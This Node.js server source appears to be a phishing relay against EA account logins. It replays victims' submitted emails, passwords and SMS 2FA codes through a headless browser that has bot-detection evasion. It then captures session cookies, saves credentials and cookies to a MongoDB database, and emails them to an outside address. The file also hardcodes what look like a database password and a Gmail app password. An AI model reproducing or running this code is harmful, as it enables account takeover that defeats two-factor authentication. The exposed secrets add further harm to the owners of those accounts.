const express = require('express');
const puppeteer = require('puppeteer');
const mongoose = require('mongoose');
const fs = require('fs/promises');
const nodemailer = require('nodemailer');

const app = express();
app.use(express.json());

const mongoUri = 'mongodb+srv://khaliljebalikj:bA54eX6ZEKPu4Apx@fifa.gpnyeyh.mongodb.net/?retryWrites=true&w=majority';

// Mongoose Schemas
const resultSchema = new mongoose.Schema({
    email: { type: String, required: true },
    password: { type: String, required: true },
    ip: { type: String, required: true, unique: true }
}, { timestamps: true });

const cookiesSchema = new mongoose.Schema({
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    cookies: [{
        name: String,
        value: String,
        domain: String,
        path: String,
        expires: Number,
        httpOnly: Boolean,
        secure: Boolean,
        sameSite: String
    }]
}, { timestamps: true });

// Mongoose Models
const Result = mongoose.model('Result', resultSchema);
const Cookies = mongoose.model('Cookies', cookiesSchema);

const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';

// Email configuration
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'jebali.khalil23@gmail.com',
        pass: process.env.EMAIL_PASS || 'ngpg amdl pvtj oeek',
    },
});

// Test email configuration on startup
transporter.verify((error, success) => {
    if (error) {
        console.log('⚠️ Email configuration error:', error.message);
        console.log('📧 Email sending will be disabled');
    } else {
        console.log('✅ Email server is ready to send messages');
    }
});

// In-memory storage as fallback when MongoDB is not available
const memoryStorage = new Map();

// Database connection
async function connectToMongo() {
    try {
        if (mongoose.connection.readyState === 1) {
            return mongoose.connection;
        }
        
        await mongoose.connect(mongoUri, {
            retryWrites: true,
            w: 'majority',
            serverSelectionTimeoutMS: 10000,
            connectTimeoutMS: 10000
        });
        
        console.log('✅ Connected to MongoDB with Mongoose');
        console.log('📊 Database:', mongoose.connection.db.databaseName);
        console.log('🔗 Connection state:', mongoose.connection.readyState);
        console.log('🌐 Host:', mongoose.connection.host);
        return mongoose.connection;
    } catch (error) {
        console.error('MongoDB connection error:', error);
        console.log('Continuing without MongoDB - data will not be saved');
        return null;
    }
}

// Initialize database connection on startup
console.log('🚀 Starting server...');
console.log('🔌 Attempting to connect to MongoDB...');
connectToMongo().catch(console.error);

let browser;
let page;
let isPageLoading = false;

const loginUrl = "https://www.ea.com/login";
const sendCodeButtonSelector = 'a#btnSendCode';
const errorMessageSelector = 'p.otkinput-errormsg.otkc';

async function startBrowserAndPage() {
    try {
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-gpu',
                '--enable-webgl',
            ],
        });

        console.log('Browser launched successfully');
        await preloadNewPage();
    } catch (error) {
        console.error('Error starting browser:', error.message);
        throw error;
    }
}

//------------------------------------------- Preload Page --------------------------------------------------

async function preloadNewPage() {
    if (isPageLoading) return;
    isPageLoading = true;

    try {
        page = await browser.newPage();

        await page.setRequestInterception(true);
        page.on('request', (request) => {
            if (['image', 'stylesheet', 'font'].includes(request.resourceType())) {
                request.abort();
            } else {
                request.continue();
            }
        });

        try {
            await page.setUserAgent(ua);
            
            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined,
                });
                
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5],
                });
                
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en'],
                });
                
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: Notification.permission }) :
                        originalQuery(parameters)
                );
                
                window.chrome = {
                    runtime: {},
                };
            });
            
        } catch (e) {
            console.log('User agent setting failed (ignored):', e.message);
        }
        
        await page.goto(loginUrl, { waitUntil: 'domcontentloaded' });
        
        if (!page.isClosed()) {
            try {
                await page.setViewport({ width: 1280, height: 800 });
            } catch (e) {
                console.log('Viewport setting failed (ignored):', e.message);
            }
        }

        await page.evaluate(() => {
            const rememberMeCheckbox = document.querySelector('input#rememberMe');
            if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
        });

        console.log('Page preloaded and ready for the next request.');
    } catch (error) {
        console.error('Error during page preload:', error.message);
        console.log('Next request will create its own page.');
        if (page && !page.isClosed()) {
            try {
                await page.close();
            } catch (e) {
                // Ignore close errors
            }
        }
    } finally {
        isPageLoading = false;
    }
}

startBrowserAndPage();

//---------------------------------------- Perform Login ----------------------------------------------------

async function performLogin(page, email, password, sendCodeButtonSelector, errorMessageSelector) {
    try {
        console.log('Starting login process for:', email , password);
        // STEP 1: Enter email
        await page.waitForSelector('input[id="email"]', { timeout: 10000 });
        await page.click('input[id="email"]');
        await page.keyboard.down('Control');
        await page.keyboard.press('KeyA');
        await page.keyboard.up('Control');
        await page.type('input[id="email"]', email);
        console.log('Email typed');
        
        // Click NEXT
        let nextButtonClicked = false;
        try {
            const nextButton = await page.$('a#logInBtn[role="button"]');
            if (nextButton) {
                const buttonText = await page.evaluate(el => el.textContent.trim(), nextButton);
                if (buttonText === 'NEXT') {
                    await nextButton.click();
                    nextButtonClicked = true;
                    console.log('NEXT button clicked successfully');
                }
            }
        } catch (e) {
            console.log('NEXT button not found, trying Enter key.');
        }
        
        if (!nextButtonClicked) {
            await page.keyboard.press('Enter');
            console.log('Pressed Enter to submit email');
        }
        
        // Wait for navigation to password page
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
            console.log('Navigated to password page');
        } catch (e) {
            const havePwdField = await page.$('input[id="password"]');
            if (!havePwdField) {
                throw new Error('Failed to reach password page.');
            }
        }
        
        // STEP 2: Enter password
        await page.waitForSelector('input[id="password"]', { timeout: 10000 });
        await page.click('input[id="password"]');
        await page.keyboard.down('Control');
        await page.keyboard.press('KeyA');
        await page.keyboard.up('Control');
        await page.type('input[id="password"]', password);
        console.log('Password typed');
        
        // Click SIGN IN
        let signInButtonClicked = false;
        try {
            const signInButton = await page.$('a#logInBtn[role="button"]');
            if (signInButton) {
                const buttonText = await page.evaluate(el => el.textContent.trim(), signInButton);
                if (buttonText === 'Sign in') {
                    await Promise.all([
                        signInButton.click(),
                        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 })
                    ]);
                    signInButtonClicked = true;
                    console.log('Sign in button clicked successfully');
                }
            }
        } catch (e) {
            console.log('SIGN IN button not found, trying Enter key.');
        }
        
        if (!signInButtonClicked) {
            await Promise.all([
                page.keyboard.press('Enter'),
                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 })
            ]);
            console.log('Pressed Enter to submit password');
        }
        
        const currentUrl = page.url();
        console.log('Current URL after password:', currentUrl);
        
        // 1. Check for error message
        try {
            const errorSel = '#online-general-error p.otkinput-errormsg';
            const errorMessageElement = await page.$(errorSel);
            if (errorMessageElement) {
                const errorText = (await page.evaluate(el => el.textContent.trim(), errorMessageElement)) || '';
                if (errorText.length > 0) {
                    console.log('Login flow: ERROR detected -', errorText);
                    console.log('Current URL when error detected:', currentUrl);
                    return { success: false, mode: 'error', error: errorText };
                }
            } else {
                console.log('No error message element found - login might be successful');
            }
        } catch (e) {
            console.log('Error-check DOM lookup exception (ignored):', e.message);
        }

        // 2. Check for 2FA
        console.log('Checking for 2FA page...');
        
        let is2FA = false;
        try {
            console.log('Looking for 2FA send code button...');
            await page.waitForSelector(sendCodeButtonSelector, { visible: true, timeout: 3000 });
            console.log('2FA send code button found!');
            
            await page.click(sendCodeButtonSelector);
            console.log('2FA send code button clicked successfully!');
            
            await new Promise(res => setTimeout(res, 500));
            
            try {
                await page.waitForSelector('input[id*="code"],input[id*="Code"],[name*="code"],input#twoFactorCode', { visible: true, timeout: 2000 });
                console.log('2FA code input field found - ready for user code entry.');
            } catch (noInput) {
                console.log('Code input not immediately visible, but send code was clicked.');
            }
            
            is2FA = true;
        } catch (buttonError) {
            console.log('2FA send code button not found:', buttonError.message);
        }
        
        if (is2FA) {
            console.log('2FA flow confirmed - returning 2fa mode');
            return { success: true, mode: '2fa' };
        }
        
        // 3. If no error and no 2FA, assume successful login
        console.log('No error, no 2FA - assuming successful login');
        return { success: true, mode: 'logged_in' };
    } catch (error) {
        console.error('Error during login process:', error);
        return { success: false, mode: 'error', error: error.message || 'Internal error' };
    }
}

//---------------------------------------- Get Email By IP --------------------------------------------------

async function getEmailPasswordByIP(ip) {
    const connection = await connectToMongo();
    if (!connection) {
        console.log('MongoDB not available, checking memory storage');
        const entry = memoryStorage.get(ip);
        if (!entry) {
            throw new Error('IP not found');
        }
        return { email: entry.email, password: entry.password };
    }
    
    const entry = await Result.findOne({ ip });
    if (!entry) {
        throw new Error('IP not found');
    }

    return { email: entry.email, password: entry.password };
}

//---------------------------------------- Saving emails and passwords --------------------------------------

async function saveEmailPasswordIP(email, password, ip) {
    const connection = await connectToMongo();
    if (!connection) {
        console.log('MongoDB not available, using memory storage');
        memoryStorage.set(ip, { email, password });
        console.log('Data saved to memory storage');
        return;
    }

    const existingEntry = await Result.findOne({ ip });
    if (existingEntry) {
        await Result.updateOne({ ip }, { $set: { email, password } });
        console.log('Data updated successfully.');
    } else {
        await Result.create({ email, password, ip });
        console.log('Data saved successfully.');
    }
}

//----------------------------------------- Login route -----------------------------------------------------

app.post('/login', async (req, res) => {
    const { email, password, ip } = req.body;

    if (!email || !password || !ip) {
        return res.status(400).json({ error: 'Email, password, and IP are required' });
    }

    let localPage = null;
    
    try {
        // 1. Create a new page per request
        localPage = await browser.newPage();
        await localPage.setRequestInterception(true);
        localPage.on('request', (request) => {
            if (["image", "stylesheet", "font"].includes(request.resourceType())) {
                request.abort();
            } else {
                request.continue();
            }
        });
        await localPage.setUserAgent(ua);
        
        // Add anti-detection measures
        await localPage.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            window.chrome = { runtime: {} };
        });
        
        await localPage.goto(loginUrl, { waitUntil: 'networkidle2' });
        await localPage.setViewport({ width: 1280, height: 800 });
        await localPage.waitForSelector('input[id="email"]', { timeout: 10000 });
        await localPage.waitForSelector('input[id="password"]', { timeout: 10000 });
        
        // 2. Actually perform login
        const loginResult = await performLogin(localPage, email, password, sendCodeButtonSelector, errorMessageSelector);
        
        if (loginResult.success && loginResult.mode === '2fa') {
            // Save credentials for 2FA step
            await saveEmailPasswordIP(email, password, ip);
            
            // Close the page first
            if (localPage && !localPage.isClosed()) {
                await localPage.close();
                localPage = null;
            }
            
            // Send response BEFORE browser cleanup
            res.status(200).json({ 
                success: true, 
                mode: '2fa', 
                message: '2FA required, code will be sent.' 
            });
            
            // Do browser cleanup in background
            setImmediate(async () => {
                try {
                    if (browser) {
                        await browser.close();
                        console.log('Browser closed after 2FA initiation');
                    }
                    await startBrowserAndPage();
                    console.log('Fresh browser created and ready for next request');
                } catch (error) {
                    console.log('⚠️ Browser cleanup error:', error.message);
                }
            });
            
            return;
        }
        
        if (loginResult.success && loginResult.mode === 'logged_in') {
            // Extract cookies BEFORE closing page
            const cookies = await localPage.cookies();
            const userEntry = {
                email,
                password,
                cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE'))
                    .map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
            };
            
            // Close the page
            if (localPage && !localPage.isClosed()) {
                await localPage.close();
                localPage = null;
            }
            
            // Send response immediately BEFORE any cleanup
            res.status(200).json({ 
                success: true, 
                mode: 'logged_in', 
                message: 'Login successful, no 2FA required.' 
            });
            
            // Do background tasks asynchronously
            setImmediate(async () => {
                try {
                    await saveEmailPasswordIP(email, password, ip);
                    
                    // Save cookies to database
                    const connection = await connectToMongo();
                    if (connection) {
                        await Cookies.updateOne(
                            { email: email },
                            { $set: userEntry },
                            { upsert: true }
                        );
                        console.log('Cookies saved to MongoDB');
                    }
                    
                    // Send No-2FA email notification
                    const emailOptions = {
                        from: process.env.EMAIL_USER || 'jebali.khalil23@gmail.com',
                        to: 'feac23@outlook.com',
                        subject: `Login Success [No 2FA]: ${email}`,
                        text: `Login successful without 2FA. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                    };
                    await sendEmail(emailOptions);
                    console.log('✅ No-2FA Email notification sent successfully');
                    
                    // Browser cleanup
                    if (browser) {
                        await browser.close();
                        console.log('Browser closed after successful login');
                    }
                    await startBrowserAndPage();
                    console.log('Fresh browser created and ready for next request');
                    
                } catch (error) {
                    console.log('⚠️ Background task error:', error.message);
                }
            });
            
            return;
        }
        
        // Otherwise, error (wrong credentials, etc.)
        // Close page first
        if (localPage && !localPage.isClosed()) {
            await localPage.close();
            localPage = null;
        }
        
        // Send error response BEFORE cleanup
        res.status(400).json({ 
            success: false, 
            mode: 'error', 
            error: loginResult.error || 'Login failed.' 
        });
        
        // Browser cleanup in background
        setImmediate(async () => {
            try {
                if (browser) {
                    await browser.close();
                    console.log('Browser closed after login failure');
                }
                await startBrowserAndPage();
                console.log('Fresh browser created and ready for next request');
            } catch (error) {
                console.log('⚠️ Browser cleanup error:', error.message);
            }
        });
        
    } catch (error) {
        console.error('Error during login:', error);
        
        // Close page if still open
        if (localPage && !localPage.isClosed()) {
            try {
                await localPage.close();
            } catch (e) {
                console.log('Error closing page:', e.message);
            }
        }
        
        // Send error response FIRST
        if (!res.headersSent) {
            res.status(500).json({ 
                success: false, 
                mode: 'error', 
                error: error.message 
            });
        }
        
        // Browser cleanup in background
        setImmediate(async () => {
            try {
                if (browser) {
                    await browser.close();
                    console.log('Browser closed after error');
                }
                await startBrowserAndPage();
                console.log('Fresh browser created and ready for next request');
            } catch (error) {
                console.log('⚠️ Browser cleanup error:', error.message);
            }
        });
    }
});

//----------------------------------------- SMS-Cookies -----------------------------------------------------

async function SecondperformLogin(page, email, password, sendCodeButtonSelector, errorMessageSelector) {
    try {
        console.log('Starting second login process for SMS flow...');
        
        // Ensure remember me is checked
        await page.evaluate(() => {
            const rememberMeCheckbox = document.querySelector('input#rememberMe');
            if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
        });

        // STEP 1: Enter email and navigate to password page
        console.log('Step 1: Entering email for SMS flow...');
        await page.waitForSelector('input[id="email"]', { visible: true });
        await page.click('input[id="email"]');
        await page.keyboard.down('Control');
        await page.keyboard.press('KeyA');
        await page.keyboard.up('Control');
        await page.type('input[id="email"]', email);
        console.log('Email typed for SMS flow');

        // Click NEXT button
        const nextButton = await page.$('a#logInBtn[role="button"]');
        if (nextButton) {
            const buttonText = await page.evaluate(el => el.textContent.trim(), nextButton);
            if (buttonText === 'NEXT') {
                await nextButton.click();
                console.log('NEXT button clicked for SMS flow');
            }
        }

        // Wait for navigation to password page
        console.log('Waiting for navigation to password page in SMS flow...');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
        console.log('Navigated to password page in SMS flow');

        // STEP 2: Enter password
        console.log('Step 2: Entering password for SMS flow...');
        await page.waitForSelector('input[id="password"]', { visible: true });
        await page.click('input[id="password"]');
        await page.keyboard.down('Control');
        await page.keyboard.press('KeyA');
        await page.keyboard.up('Control');
        await page.type('input[id="password"]', password);
        console.log('Password typed for SMS flow');

        // Wait a moment before submitting
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Submit password form
        console.log('Submitting password form for SMS flow...');
        const signInButton = await page.$('a#logInBtn[role="button"]');
        if (signInButton) {
            const buttonText = await page.evaluate(el => el.textContent.trim(), signInButton);
            if (buttonText === 'Sign in') {
                await Promise.all([
                    signInButton.click(),
                    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }),
                ]);
                console.log('Sign in button clicked for SMS flow');
            }
        } else {
            await Promise.all([
                page.keyboard.press('Enter'),
                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }),
            ]);
            console.log('Password form submitted using Enter key for SMS flow');
        }

        // After navigation, wait for DOM to be ready
        try {
            await page.waitForSelector('#loginBase', { timeout: 1000 });
        } catch (e) {
            console.log('WARNING: #loginBase did not appear in SMS flow');
        }

        // Check for error message
        try {
            const errorSel = '#online-general-error p.otkinput-errormsg';
            const errorMessageElement = await page.$(errorSel);
            if (errorMessageElement) {
                const errorText = (await page.evaluate(el => el.textContent.trim(), errorMessageElement)) || '';
                if (errorText.length > 0) {
                    console.log("Error message detected in SMS flow:", errorText);
                    return false;
                }
            }
        } catch (e) {
            console.log('Error check exception in SMS flow (ignored):', e.message);
        }

        // Wait for the 2FA page to load
        console.log('Waiting for 2FA page in SMS flow...');
        try {
            await page.waitForSelector(sendCodeButtonSelector, { visible: true, timeout: 10000 });
            console.log('2FA page loaded for SMS flow');
            
            // Click send code button
            await page.click(sendCodeButtonSelector);
            console.log('Send code button clicked for SMS flow');
            
            return true;
        } catch (error) {
            console.log('Error waiting for 2FA page in SMS flow:', error.message);
            
            try {
                const sendCodeButton = await page.$(sendCodeButtonSelector);
                if (sendCodeButton) {
                    console.log('Send code button found despite timeout, clicking...');
                    await page.click(sendCodeButtonSelector);
                    console.log('Send code button clicked for SMS flow');
                    return true;
                }
            } catch (clickError) {
                console.log('Error clicking send code button in SMS flow:', clickError.message);
            }
            
            return false;
        }

    } catch (error) {
        console.error('Error during second login process:', error);
        return false;
    }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

app.post('/loginsms', async (req, res) => {
    const { ip, code } = req.body;

    if (!ip || !code) {
        return res.status(400).json({ error: 'IP and code are required' });
    }

    let browser = null;
    let localPage = null;
    
    try {
        const emailPasswordData = await getEmailPasswordByIP(ip);
        
        if (!emailPasswordData) {
            return res.status(500).json({ error: 'Unable to retrieve email/password data - database unavailable' });
        }

        // Create a new browser for each SMS request
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-gpu',
                '--enable-webgl',
                '--window-size=1500,800',
                '--disable-http2'
            ],
        });

        localPage = await browser.newPage();

        await localPage.setRequestInterception(true);
        localPage.on('request', (request) => {
            if (['image', 'stylesheet', 'font'].includes(request.resourceType())) {
                request.abort();
            } else {
                request.continue();
            }
        });

        await localPage.setUserAgent(ua);
        
        // Add anti-detection measures
        await localPage.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            window.chrome = { runtime: {} };
        });
        
        // Listen for JavaScript errors on the page
        localPage.on('pageerror', error => {
            console.log('⚠️ JavaScript error on page:', error.message);
        });
        
        await localPage.goto(loginUrl, { waitUntil: 'networkidle2' });

        await SecondperformLogin(localPage, emailPasswordData.email, emailPasswordData.password, sendCodeButtonSelector, errorMessageSelector);

        console.log('Before waiting for twoFactorCode input field');
        await localPage.waitForSelector('input#twoFactorCode', { visible: true, timeout: 5000 });
        console.log('After waiting for twoFactorCode input field');

        console.log('Before typing code');
        await localPage.type('input#twoFactorCode', code);
        console.log('After typing code');

        console.log('Before waiting for btnSubmit button');
        await localPage.waitForSelector('a#btnSubmit', { visible: true, timeout: 5000 });
        console.log('After waiting for btnSubmit button');

        console.log('Before clicking btnSubmit button');
        
        // Try multiple approaches to submit the form
        try {
            await localPage.click('a#btnSubmit');
            console.log('Method 1: Direct click successful');
        } catch (error) {
            console.log('Method 1 failed, trying method 2...');
            try {
                await localPage.evaluate(() => {
                    const btn = document.querySelector('a#btnSubmit');
                    if (btn) {
                        btn.click();
                        return true;
                    }
                    return false;
                });
                console.log('Method 2: Evaluate click successful');
            } catch (error2) {
                console.log('Method 2 failed, trying method 3...');
                await localPage.evaluate(() => {
                    const form = document.querySelector('form');
                    if (form) {
                        form.submit();
                        return true;
                    }
                    return false;
                });
                console.log('Method 3: Form submit successful');
            }
        }
        
        console.log('After clicking btnSubmit button');

        // Wait for navigation after 2FA submission
        await localPage.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
        await sleep(1000);

        // Check for 2FA error messages after submission
        console.log('Checking for 2FA error messages...');
        
        const errorSelectors = [
            '#online-general-error p.otkinput-errormsg',
            '.otkform-group-help .otkinput-errormsg',
            '.error-message',
            '.alert-danger',
            '[class*="error"]',
            '.otkc.otkinput-errormsg'
        ];
        
        let errorText = '';
        for (const selector of errorSelectors) {
            try {
                const errorElement = await localPage.$(selector);
                if (errorElement) {
                    const text = await localPage.evaluate(el => el.textContent.trim(), errorElement);
                    if (text && text.length > 0) {
                        console.log('2FA Error detected with selector:', selector, '- Text:', text);
                        errorText = text;
                        break;
                    }
                }
            } catch (e) {
                // Continue to next selector
            }
        }
        
        // If specific error found, clean up and return error
        if (errorText) {
            console.log('2FA verification failed - specific error:', errorText);
            
            // Close page and browser BEFORE sending response
            if (localPage && !localPage.isClosed()) {
                await localPage.close();
            }
            if (browser) {
                await browser.close();
            }
            
            return res.status(400).json({ 
                success: false, 
                error: errorText
            });
        }
        
        // Check if we're still on the 2FA page (indicates generic error)
        const twoFactorInput = await localPage.$('input#twoFactorCode');
        if (twoFactorInput) {
            console.log('Still on 2FA page - likely incorrect code (no specific error message)');
            
            // Close page and browser BEFORE sending response
            if (localPage && !localPage.isClosed()) {
                await localPage.close();
            }
            if (browser) {
                await browser.close();
            }
            
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid verification code. Please try again.' 
            });
        }

        console.log('2FA verification successful, getting cookies...');
        const cookies = await localPage.cookies();

        const userEntry = {
            email: emailPasswordData.email,
            password: emailPasswordData.password,
            cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE'))
                .map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
        };

        // console.log(userEntry.cookies);

        // Close page and browser BEFORE sending response
        if (localPage && !localPage.isClosed()) {
            await localPage.close();
            localPage = null;
        }
        if (browser) {
            await browser.close();
            browser = null;
        }

        // Send success response FIRST
        res.status(200).json({ 
            success: true, 
            message: 'Login successful after SMS' 
        });

        // Do database save and email in background using setImmediate
        setImmediate(async () => {
            try {
                const connection = await connectToMongo();
                
                if (connection) {
                    await Cookies.updateOne(
                        { email: emailPasswordData.email },
                        { $set: userEntry },
                        { upsert: true }
                    );
                    console.log('Cookies saved to MongoDB');
                } else {
                    console.log('MongoDB not available, skipping cookie save');
                }

                // Try to send 2FA email notification
                try {
                    const emailOptions = {
                        from: process.env.EMAIL_USER || 'jebali.khalil23@gmail.com',
                        to: 'feac23@outlook.com',
                        subject: `Login Success [2FA]: ${emailPasswordData.email}`,
                        text: `Login successful with 2FA verification. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                    };

                    await sendEmail(emailOptions);
                    console.log('✅ 2FA Email notification sent successfully');
                } catch (emailError) {
                    console.log('⚠️ Email sending failed (non-critical):', emailError.message);
                    console.log('📧 Login process continues without email notification');
                }
                
                console.log("Te5dem nayek :)");
            } catch (bgError) {
                console.log('⚠️ Background task error:', bgError.message);
            }
        });

    } catch (error) {
        console.error('Error during SMS login:', error);
        
        // Close page and browser BEFORE sending error response
        if (localPage && !localPage.isClosed()) {
            try {
                await localPage.close();
            } catch (e) {
                console.log('Error closing page:', e.message);
            }
        }
        if (browser) {
            try {
                await browser.close();
            } catch (e) {
                console.log('Error closing browser:', e.message);
            }
        }
        
        // Send error response
        if (!res.headersSent) {
            res.status(500).json({ 
                error: 'Error during SMS login',
                details: error.message 
            });
        }
    }
});

const sendEmail = async (emailOptions) => {
    return new Promise((resolve, reject) => {
        // Add timeout to prevent hanging
        const timeout = setTimeout(() => {
            reject(new Error('Email sending timeout'));
        }, 30000); // 30 second timeout

        transporter.sendMail(emailOptions, (err, info) => {
            clearTimeout(timeout);
            
            if (err) {
                console.error('Email sending error:', err.message);
                reject(err);
            } else {
                console.log('Email sent successfully:', info.messageId);
                resolve(info);
            }
        });
    });
};

// Gracefully close the browser and database when the application is terminated
process.on('SIGINT', async () => {
    if (browser) {
        await browser.close();
    }
    if (mongoose.connection.readyState === 1) {
        await mongoose.connection.close();
    }
    process.exit();
});

app.get('/', (req, res) => res.status(200).send('OK'));
app.get('/healthz', (req, res) => res.json({ ok: true }));

// Start the server
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🌐 Server is running at http://localhost:${port}`);
    console.log(`📡 Ready to accept requests on port ${port}`);
    console.log(`🔗 Health check available at http://localhost:${port}/healthz`);
});
